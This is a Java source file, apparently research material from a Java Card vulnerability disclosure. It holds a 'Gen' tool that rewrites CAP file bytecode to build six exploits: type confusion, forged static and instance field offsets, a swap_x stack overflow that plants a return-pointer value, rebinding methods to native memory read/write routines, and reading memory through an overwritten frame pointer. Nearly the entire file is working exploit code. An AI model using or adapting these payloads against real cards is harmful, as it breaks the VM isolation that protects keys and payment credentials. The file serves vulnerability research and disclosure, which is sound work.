/*## (c) SECURITY EXPLORATIONS    2019 poland                                #*/
/*##     http://www.security-explorations.com                                #*/

/* RESEARCH MATERIAL:	SE-2019-01                                            */
/* Security vulnerabilities in Java Card                                      */

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

import java.lang.*;
import java.lang.reflect.*;
import java.util.*;
import java.util.jar.*;
import java.io.*;

public class Gen {
 public static final byte aload_0     = (byte)0x18;
 public static final byte aload_1     = (byte)0x19;
 public static final byte areturn     = (byte)0x77;

 public static final byte getstatic_s = (byte)0x7d;
 public static final byte sreturn     = (byte)0x78;

 public static final byte getfield_a  = (byte)0x83;
 public static final byte getfield_b  = (byte)0x84;
 public static final byte getfield_s  = (byte)0x85;
 public static final byte getfield_i  = (byte)0x86;

 public static final byte putfield_a  = (byte)0x87;
 public static final byte putfield_b  = (byte)0x88;
 public static final byte putfield_s  = (byte)0x89;
 public static final byte putfield_i  = (byte)0x8a;

 public static final byte vreturn     = (byte)0x7a;

 public static final byte sload_0     = (byte)0x1c;
 public static final byte sload_1     = (byte)0x1d;

 public static final byte  nop        = (byte)0x00;
 public static final byte  sspush     = (byte)0x11;
 public static final byte  swap_x     = (byte)0x40;

 public static final byte  _return    = (byte)0x7a;
 public static final byte  sload      = (byte)0x16;
 public static final byte  sstore     = (byte)0x29;

 public static final byte  pop        = (byte)0x3b;

 public static final byte  iipush     = (byte)0x14;
 public static final byte  _goto      = (byte)0x70;

 public static final byte  aload      = (byte)0x15;
 public static final byte  astore     = (byte)0x28;

 public static final byte  invokestatic = (byte)0x8d;

 public static Component.method_descriptor_info lookup_method_descriptor(CAPFile cap,EXPFile exp,String clazz,String name,String mdesc) {
  int ctoken=exp.lookup_class_token(clazz);
  int mtoken=exp.lookup_method_token(clazz,name,mdesc);

  Component.Descriptor desc=(Component.Descriptor)CAPFile.lookup_component(Component.COMPONENT_Descriptor);
  
  for(int i=0;i<desc.class_count;i++) {
   Component.class_descriptor_info cdesc=desc.classes[i];

   if (cdesc.token==ctoken) {
    for(int j=0;j<cdesc.methods.length;j++) {
     Component.method_descriptor_info mdi=cdesc.methods[j];

     if (mdi.token==mtoken) return mdi;     
    }
   }   
  }

  return null;
 }

 public static Component.method_info lookup_method_info(CAPFile cap,EXPFile exp,String clazz,String name,String mdesc) {
  Component.Method mcomp=(Component.Method)CAPFile.lookup_component(Component.COMPONENT_Method);

  Component.method_descriptor_info mdi=lookup_method_descriptor(cap,exp,clazz,name,mdesc);
  
  for(int i=0;i<mcomp.methods.length;i++) {
   Component.method_info mi=mcomp.methods[i];
   if (mi.mdi==mdi) return mi;
  }

  return null;
 }

 public static void gen_exp1(CAPFile cap,EXPFile exp,int arg) {
  Component.Method mcomp=(Component.Method)CAPFile.lookup_component(Component.COMPONENT_Method);

  Component.method_info mi=lookup_method_info(cap,exp,"com/se/vulns/Cast","cast2tab","([BLjava/lang/Object;)[B");

  byte code[]=mi.bytecodes;

  if ((code.length==2)&&(code[0]==aload_0)&&(code[1]==areturn)) {
   mcomp.data[mi.bytecode_off]=aload_1;
  }
 }

 public static void gen_exp2(CAPFile cap,EXPFile exp,int arg) {
  Component.Method mcomp=(Component.Method)CAPFile.lookup_component(Component.COMPONENT_Method);

  int cpidx=-1;

  Component.method_info mi=lookup_method_info(cap,exp,"com/se/vulns/Test","get_static","()S");

  byte code[]=mi.bytecodes;

  if ((code.length==4)&&(code[0]==getstatic_s)&&(code[3]==sreturn)) {
   cpidx=((((int)code[1])&0xff)<<8)|(((int)code[2])&0xff);
  }

  if (cpidx>0) {
   Component.ConstantPool cpcomp=(Component.ConstantPool)CAPFile.lookup_component(Component.COMPONENT_ConstantPool);
   Component.cp_info cpinfo=cpcomp.constant_pool[cpidx];

   if (cpinfo.tag==Component.CONSTANT_StaticFieldref) {
    Component.StaticFieldref sfdref=(Component.StaticFieldref)cpinfo.ref;
    sfdref.offset=(short)arg;
    
    cpcomp.sync();
   }
  }
 }

 public static void gen_exp3(CAPFile cap,EXPFile exp,int arg) {
  Component.Method mcomp=(Component.Method)CAPFile.lookup_component(Component.COMPONENT_Method);

  Hashtable skipoffsets=new Hashtable();
  int cpoff=-1;

  Component.method_info mi=lookup_method_info(cap,exp,"com/se/vulns/Test","getfield_a","()Ljava/lang/Object;");

  byte code[]=mi.bytecodes;
  int size=code.length;

  if ((code[size-3]==getfield_a)&&(code[size-1]==areturn)) {
   cpoff=mi.bytecode_off+size-2;
   mcomp.data[cpoff]=(byte)arg;

   skipoffsets.put(new Integer(cpoff),new Integer(cpoff));
  }

  mi=lookup_method_info(cap,exp,"com/se/vulns/Test","putfield_a","(Ljava/lang/Object;)V");

  code=mi.bytecodes;
  size=code.length;

  if ((code[size-3]==putfield_a)&&(code[size-1]==vreturn)) {
   cpoff=mi.bytecode_off+size-2;
   mcomp.data[cpoff]=(byte)arg;

   skipoffsets.put(new Integer(cpoff),new Integer(cpoff));
  }

  mi=lookup_method_info(cap,exp,"com/se/vulns/Test","getfield_b","()B");

  code=mi.bytecodes;
  size=code.length;

  if ((code[size-3]==getfield_b)&&(code[size-1]==sreturn)) {
   cpoff=mi.bytecode_off+size-2;
   mcomp.data[cpoff]=(byte)arg;

   skipoffsets.put(new Integer(cpoff),new Integer(cpoff));
  }

  mi=lookup_method_info(cap,exp,"com/se/vulns/Test","putfield_b","(B)V");

  code=mi.bytecodes;
  size=code.length;

  if ((code[size-3]==putfield_b)&&(code[size-1]==vreturn)) {
   cpoff=mi.bytecode_off+size-2;
   mcomp.data[cpoff]=(byte)arg;

   skipoffsets.put(new Integer(cpoff),new Integer(cpoff));
  }

  mi=lookup_method_info(cap,exp,"com/se/vulns/Test","getfield_s","()S");

  code=mi.bytecodes;
  size=code.length;

  if ((code[size-3]==getfield_s)&&(code[size-1]==sreturn)) {
   cpoff=mi.bytecode_off+size-2;
   mcomp.data[cpoff]=(byte)arg;

   skipoffsets.put(new Integer(cpoff),new Integer(cpoff));
  }

  mi=lookup_method_info(cap,exp,"com/se/vulns/Test","putfield_s","(S)V");

  code=mi.bytecodes;
  size=code.length;

  if ((code[size-3]==putfield_s)&&(code[size-1]==vreturn)) {
   cpoff=mi.bytecode_off+size-2;
   mcomp.data[cpoff]=(byte)arg;

   skipoffsets.put(new Integer(cpoff),new Integer(cpoff));
  }

  mi=lookup_method_info(cap,exp,"com/se/vulns/Test","cast2short","(Ljava/lang/Object;S)S");

  code=mi.bytecodes;

  if ((code.length==2)&&(code[0]==sload_1)&&(code[1]==sreturn)) {
   mcomp.data[mi.bytecode_off]=sload_0;
  }

  mi=lookup_method_info(cap,exp,"com/se/vulns/Test","cast2obj","(Ljava/lang/Object;S)Ljava/lang/Object;");

  code=mi.bytecodes;

  if ((code.length==2)&&(code[0]==aload_0)&&(code[1]==areturn)) {
   mcomp.data[mi.bytecode_off]=aload_1;
  }

  Component.ReferenceLocation refloc=(Component.ReferenceLocation)CAPFile.lookup_component(Component.COMPONENT_ReferenceLocation);

  Vector offsets=new Vector();

  int off=0;
  int last=0;

  for(int i=0;i<refloc.offsets_to_byte_indices.length;i++) {
   int v=((int)refloc.offsets_to_byte_indices[i])&0xff;
   off+=v;

   if ((v!=255)&&(skipoffsets.get(new Integer(off))==null)) {
    offsets.addElement(new Integer(off-last));
    last=off;
   }
  }

  ByteArrayOutputStream baos=new ByteArrayOutputStream();

  for(int i=0;i<offsets.size();i++) {
   off=((Integer)offsets.elementAt(i)).intValue();

   while(off>=255) {
    baos.write(255);
    off-=255;
   }

   baos.write(off);    
  }

  refloc.offsets_to_byte_indices=baos.toByteArray();

  refloc.sync();
 }

 public static void gen_exp4(CAPFile cap,EXPFile exp,int arg) {
  Component.Method mcomp=(Component.Method)CAPFile.lookup_component(Component.COMPONENT_Method);

  Component.method_info mi=lookup_method_info(cap,exp,"com/se/vulns/Test","trigger_swapx","()V");

  byte code[]=mi.bytecodes;
  int size=code.length;

  if (code[size-1]==vreturn) {
   for(int i=0;i<size-1;i++) {
    mcomp.data[mi.bytecode_off+i]=nop;
   }

   int pos=mi.bytecode_off;

   //change flags|max_stack
   mcomp.data[pos-2]=(byte)0x0f;
   //change nargs|max_local
   mcomp.data[pos-1]=(byte)0x0f;

   int M=0x01;
   int N=0x0d;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0x11;
   mcomp.data[pos++]=(byte)0x22;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0x33;//RIP = 0x33445566
   mcomp.data[pos++]=(byte)0x44;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0x55;
   mcomp.data[pos++]=(byte)0x66;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0x77;
   mcomp.data[pos++]=(byte)0x88;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0x99;
   mcomp.data[pos++]=(byte)0xaa;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0xbb;
   mcomp.data[pos++]=(byte)0xcc;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0xbb;
   mcomp.data[pos++]=(byte)0xcc;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0xdd;
   mcomp.data[pos++]=(byte)0xee;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0xff;
   mcomp.data[pos++]=(byte)0x10;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0x05;//loop count
   mcomp.data[pos++]=(byte)0x12;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)M;
   mcomp.data[pos++]=(byte)N;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0x15;
   mcomp.data[pos++]=(byte)0x16;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0x17;
   mcomp.data[pos++]=(byte)0x18;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0x19;
   mcomp.data[pos++]=(byte)0x1a;

   mcomp.data[pos++]=sspush;
   mcomp.data[pos++]=(byte)0x1b;
   mcomp.data[pos++]=(byte)0x1c;

   mcomp.data[pos++]=swap_x;
   mcomp.data[pos++]=(byte)((M<<4)|N);   
  }
 }

 public static void gen_exp5(CAPFile cap,EXPFile exp,int arg) {
  Component.Method mcomp=(Component.Method)CAPFile.lookup_component(Component.COMPONENT_Method);

  Component.method_info mi=lookup_method_info(cap,exp,"com/se/vulns/Test","readShort","(IS)S");

  byte code[]=mi.bytecodes;
  int size=code.length;

  if (code[size-1]==sreturn) {
   int pos=mi.bytecode_off;

   byte nativeidx=(byte)0x99;//_Java_NativeMethod_com_sun_javacard_impl_NativeMethods_readShort

   //change flags|max_stack
   mcomp.data[pos-2]=(byte)0x2f;
   mcomp.data[pos-1]=(byte)nativeidx;//method idx
  }

  mi=lookup_method_info(cap,exp,"com/se/vulns/Test","writeShort","(ISS)V");

  code=mi.bytecodes;
  size=code.length;

  if (code[size-1]==vreturn) {
   int pos=mi.bytecode_off;

   byte nativeidx=(byte)0x95;//_Java_NativeMethod_com_sun_javacard_impl_NativeMethods_writeShort

   //change flags|max_stack
   mcomp.data[pos-2]=(byte)0x2f;
   mcomp.data[pos-1]=(byte)nativeidx;//method idx
  }
 }

 private static int lookup_sspush(byte code[],int pos,int val) {
  while(true) {
   if ((code[pos]==sspush)&&(code[pos+1]==(byte)((val>>8)&0xff))&&(code[pos+2]==(byte)(val&0xff))) {
    return pos;
   } else pos++;
  }
 }

 private static int lookup_opcode(byte code[],int pos,byte opcode) {
  while(true) {
   if (code[pos]==opcode) {
    return pos;
   } else pos++;
  }
 }

 private static void gen_read_stack(CAPFile cap,EXPFile exp,int arg,String method,byte load_opcode,byte store_opcode) {
  Component.Method mcomp=(Component.Method)CAPFile.lookup_component(Component.COMPONENT_Method);

  Component.method_info mi=lookup_method_info(cap,exp,"com/se/vulns/Test",method,"(IS)V");

  byte code[]=mi.bytecodes;
  int size=code.length;

  int off1=lookup_sspush(mcomp.data,mi.bytecode_off,0x1122);
  int off2=lookup_opcode(mcomp.data,off1,invokestatic);

  int off3=lookup_sspush(mcomp.data,off2,0x3344);
  int off4=lookup_opcode(mcomp.data,off3,_return);

  for(int i=off1;i<off2;i++) {
   mcomp.data[i]=nop;
  }

  int pos=off1;

  //sequence for reading mem through overwritten FP val
  mcomp.data[pos++]=iipush;
  mcomp.data[pos++]=load_opcode;
  mcomp.data[pos++]=(byte)arg;
  mcomp.data[pos++]=_goto;
  mcomp.data[pos++]=(byte)4;

  mcomp.data[pos++]=_goto;
  mcomp.data[pos++]=(byte)-4;

  for(int i=off3;i<off4;i++) {
   mcomp.data[i]=nop;
  }

  pos=off3;

  //sequence for overwriting FP val
  mcomp.data[pos++]=iipush;
  mcomp.data[pos++]=sload;
  mcomp.data[pos++]=(byte)0x02;//idx of FP arg
  mcomp.data[pos++]=_goto;
  mcomp.data[pos++]=(byte)4;

  mcomp.data[pos++]=pop;

  mcomp.data[pos++]=iipush;
  mcomp.data[pos++]=store_opcode;
  mcomp.data[pos++]=(byte)0x0f;//idx of saved FP val
  mcomp.data[pos++]=_return;
  mcomp.data[pos++]=nop;

  mcomp.data[pos++]=pop;

  mcomp.data[pos++]=_goto;
  mcomp.data[pos++]=(byte)-11;
 }

 public static void gen_exp6(CAPFile cap,EXPFile exp,int arg) {
  gen_read_stack(cap,exp,arg,"read_stack_s",sload,sstore);
  gen_read_stack(cap,exp,arg,"read_stack_a",aload,astore);
 }

 public static void process(CAPFile cap,EXPFile exp,int expidx,int arg) {
  switch(expidx) {
   case 1:
    gen_exp1(cap,exp,arg);
    break;
   case 2:
    gen_exp2(cap,exp,arg);
    break;
   case 3:
    gen_exp3(cap,exp,arg);
    break;
   case 4:
    gen_exp4(cap,exp,arg);
    break;
   case 5:
    gen_exp5(cap,exp,arg);
    break;
   case 6:
    gen_exp6(cap,exp,arg);
    break;
  }
 }

 public static void main(String args[]) {
  try {
   if (args.length!=5) {
    System.out.println("/*## (c) SECURITY EXPLORATIONS    2019 poland                                #*/");
    System.out.println("/*##     http://www.security-explorations.com                                #*/");
    System.out.println("Gen Tool for Java Card");
    System.err.println("usage: Gen incap inexp outcap eidx arg");
    System.exit(-1);
   }

   String incapfile=args[0];
   String expfile=args[1];
   String outcapfile=args[2];

   int eidx=Integer.parseInt(args[3]);
   int arg=Integer.parseInt(args[4],0x10);

   CAPFile cap=new CAPFile(incapfile);
   EXPFile exp=new EXPFile(expfile);

   process(cap,exp,eidx,arg);

   cap.save(outcapfile);
  } catch(Throwable e) {} 
 }
}
